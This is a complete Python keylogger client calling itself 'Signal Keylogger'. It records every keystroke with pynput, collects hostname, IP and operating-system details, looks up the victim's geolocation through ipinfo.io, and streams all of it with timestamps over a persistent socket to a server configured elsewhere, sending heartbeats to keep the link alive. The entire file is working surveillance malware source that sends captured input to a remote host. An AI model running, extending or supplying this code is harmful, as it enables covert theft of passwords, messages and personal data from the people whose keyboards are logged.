from pynput.keyboard import Key, Listener
import socket
import threading
import platform
import time
import requests
from config import config

# Global socket connection
client_socket = None
connection_lock = threading.Lock()


# Function to establish and maintain connection
def connect_to_server():
    global client_socket

    host = config.get('client', 'server_host')
    port = config.get('client', 'server_port')
    timeout = config.get('client', 'connection_timeout')
    reconnect_delay = config.get('client', 'reconnect_delay')

    while True:
        try:
            print(f"[*] Attempting to connect to {host}:{port}...")
            client_socket = socket.create_connection((host, port), timeout=timeout)
            print(f"[+] Connected to server at {host}:{port}")
            return True
        except Exception as e:
            print(f"[!] Connection failed: {e}. Retrying in {reconnect_delay} seconds...")
            time.sleep(reconnect_delay)


# Function to send data through persistent connection
def send_data_to_gui(data):
    global client_socket
    with connection_lock:
        try:
            if client_socket:
                client_socket.sendall(data.encode())
                # Only print for non-keystroke data to reduce spam
                if any(keyword in data for keyword in ["COMPUTER_INFO", "GEO_LOCATION", "HEARTBEAT"]):
                    print(f"[+] Sent: {data[:50]}...")
            else:
                print("[!] No active connection")
        except Exception as e:
            print(f"[!] Error sending data: {e}")
            # Try to reconnect
            client_socket = None
            connect_to_server()


# Format key into readable string
def format_key(key):
    if key == Key.space:
        return " "
    elif key == Key.enter:
        return "\n"
    elif key == Key.backspace:
        return "[BACKSPACE]"
    elif isinstance(key, Key):
        return f"[{key.name.upper()}]"
    else:
        return str(key).replace("'", "")


# Function to send accumulated keystrokes to the GUI with timestamp
def send_current_char(char):
    if char.strip():  # Only send if it's not empty
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
        send_data_to_gui(f"[{timestamp}] {char.strip()}")


# Function to send computer info and geo-location to GUI
def send_initial_data():
    computer_info = get_computer_info()
    geo_location = get_geo_location()

    # Send computer information
    send_data_to_gui(f"COMPUTER_INFO: {computer_info}")
    time.sleep(0.1)  # Small delay between messages

    # Send geo-location information
    send_data_to_gui(f"GEO_LOCATION: {geo_location}")


# Function to retrieve computer information
def get_computer_info():
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
    system = platform.system()
    release = platform.release()
    version = platform.version()
    machine = platform.machine()
    processor = platform.processor()

    computer_info = (
        f"Hostname: {hostname}\n"
        f"IP Address: {ip_address}\n"
        f"Operating System: {system} {release}\n"
        f"OS Version: {version}\n"
        f"Machine: {machine}\n"
        f"Processor: {processor}\n"
    )
    return computer_info


# Function to retrieve geo-location information
def get_geo_location():
    try:
        response = requests.get("https://ipinfo.io/json", timeout=5)
        if response.status_code == 200:
            data = response.json()
            location = (
                f"IP Address: {data.get('ip')}\n"
                f"City: {data.get('city')}\n"
                f"Region: {data.get('region')}\n"
                f"Country: {data.get('country')}\n"
                f"Location (Lat, Long): {data.get('loc')}\n"
                f"Organization: {data.get('org')}\n"
            )
            return location
        else:
            return "Failed to get geo-location data."
    except Exception as e:
        return f"Error retrieving geo-location: {e}"


# Accumulate keystrokes as individual characters
current_char = ""


# Key press (optional if you prefer release only)
def on_press(key):
    pass  # You can log key press if needed


# Handle key release and update the current character
def on_release(key):
    global current_char

    formatted = format_key(key)
    send_on_enter = config.get('keylogger', 'send_on_enter')

    if formatted == "\n" and send_on_enter:
        # When Enter key is pressed, send the character and start a new line
        send_current_char(current_char)
        current_char = ""  # Clear the current character after sending
    elif formatted == "[BACKSPACE]":
        # When backspace is pressed, remove the last character from the current character
        if current_char:
            current_char = current_char[:-1]  # Remove the last character
    else:
        # Otherwise, add the character to the current character string
        current_char += formatted

    # Optional: Send every character immediately if send_on_enter is False
    if not send_on_enter and formatted not in ["\n", "[BACKSPACE]"]:
        send_current_char(formatted)

    if key == Key.esc:
        return False  # Stop listener on ESC


# Heartbeat to keep connection alive
def heartbeat():
    heartbeat_interval = config.get('client', 'heartbeat_interval')

    while True:
        time.sleep(heartbeat_interval)
        send_data_to_gui("HEARTBEAT")


# Start listener and send initial data
def start_keylogger():
    print("[*] Signal Keylogger starting...")
    print(f"[*] Configuration loaded from: {config.config_file}")

    # Establish persistent connection
    connect_to_server()

    # Send initial computer and geo-location info
    print("[*] Sending initial data...")
    send_initial_data()

    # Start heartbeat thread
    print(f"[*] Starting heartbeat (interval: {config.get('client', 'heartbeat_interval')}s)")
    heartbeat_thread = threading.Thread(target=heartbeat, daemon=True)
    heartbeat_thread.start()

    # Start the listener
    print("[*] Starting keyboard listener...")
    print("[*] Press ESC to stop")
    listener_thread = threading.Thread(target=start_listener)
    listener_thread.daemon = True
    listener_thread.start()

    # Keep the main program running while the listener runs in the background
    try:
        listener_thread.join()
    except KeyboardInterrupt:
        print("\n[*] Keylogger stopped by user")


# Start listener
def start_listener():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()


if __name__ == "__main__":
    start_keylogger()